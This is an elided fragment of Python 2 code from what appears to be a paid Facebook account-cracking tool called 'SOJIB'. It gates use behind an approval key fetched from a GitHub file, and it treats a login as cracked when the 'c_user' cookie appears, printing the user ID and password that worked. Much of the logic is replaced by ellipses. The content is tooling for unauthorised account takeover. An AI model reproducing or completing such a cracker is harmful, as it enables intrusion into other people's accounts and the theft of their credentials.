...
def main_apv():
    ...
    r1 = requests.get('https://github.com/K1NG-SOJIB-69/K1NG-SOJIB-69/blob/main/Approval.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In SOJIB Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SOJIB-OK] ' + coc + user + ' | ' + pass1
